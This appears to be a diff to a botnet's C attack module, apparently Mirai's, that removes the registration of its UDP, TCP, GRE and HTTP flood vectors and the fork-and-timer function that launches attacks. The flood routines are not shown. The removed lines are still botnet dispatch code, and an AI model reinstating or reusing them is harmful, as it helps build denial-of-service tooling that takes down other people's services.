@@ -21,23 +21,6 @@ int attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};
 
 BOOL attack_init(void)
 {
-    int i;
-
-    add_attack(ATK_VEC_UDP, (ATTACK_FUNC)attack_udp_generic);
-    add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);
-    add_attack(ATK_VEC_DNS, (ATTACK_FUNC)attack_udp_dns);
-	add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);
-
-    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);
-    add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack);
-    add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_tcp_stomp);
-
-    add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);
-    add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_gre_eth);
-
-    //add_attack(ATK_VEC_PROXY, (ATTACK_FUNC)attack_app_proxy);
-    add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_app_http);
-
     return TRUE;
 }
 
@@ -142,7 +125,6 @@ void attack_parse(char *buf, int len)
     }
 
     errno = 0;
-    attack_start(duration, vector, targs_len, targs, opts_len, opts);
 
     // Cleanup
     cleanup:
@@ -150,44 +132,6 @@ void attack_parse(char *buf, int len)
         free(targs);
     if (opts != NULL)
         free_opts(opts, opts_len);
-}
-
-void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
-{
-    int pid1, pid2;
-
-    pid1 = fork();
-    if (pid1 == -1 || pid1 > 0)
-        return;
-
-    pid2 = fork();
-    if (pid2 == -1)
-        exit(0);
-    else if (pid2 == 0)
-    {
-        sleep(duration);
-        kill(getppid(), 9);
-        exit(0);
-    }
-    else
-    {
-        int i;
-
-        for (i = 0; i < methods_len; i++)
-        {
-            if (methods[i]->vector == vector)
-            {
-#ifdef DEBUG
-                printf("[attack] Starting attack...\n");
-#endif
-                methods[i]->func(targs_len, targs, opts_len, opts);
-                break;
-            }
-        }
-
-        //just bail if the function returns
-        exit(0);
-    }
 }
 
 char *attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)
